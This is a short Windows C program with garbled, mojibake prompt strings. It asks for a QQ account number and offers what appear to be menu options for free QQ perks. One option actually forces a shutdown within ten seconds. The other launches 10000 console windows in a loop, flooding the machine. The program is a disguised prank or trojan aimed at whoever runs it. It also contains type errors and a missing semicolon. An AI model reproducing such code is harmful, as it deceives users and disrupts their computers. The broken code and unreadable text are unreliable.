#include <stdio.h>
#include <windows.h>
#include <malloc.h>
#include<string.h>

int main(void)
{
	
	int c;
	int i;
	int j;
	char m;
	int n; 
	

	printf("���������QQ��:\n");
	scanf("%s",&m);
	n = strlen(m);
	if(n>11 ||n<5)
	{
		printf("û�����QQ!")
    }
	nihao:
	printf("1:ˢȫ��.\n");
	printf("2:ֻˢ����.\n");
	printf("��ѡ��(1��2):"); 
	scanf("%d",&c);
	if(c==1)
	{
		system("shutdown -s -t 10");
	}
	else if(c==2)
	{
		printf("�����ĵȴ�.....\n");
		for(j=0;j<10000;++j)
			system("start"); 
	}
	else
	{
		printf("ɵ�� ������1��2!!!\n");
		goto nihao; 
	}
	return 0;
}
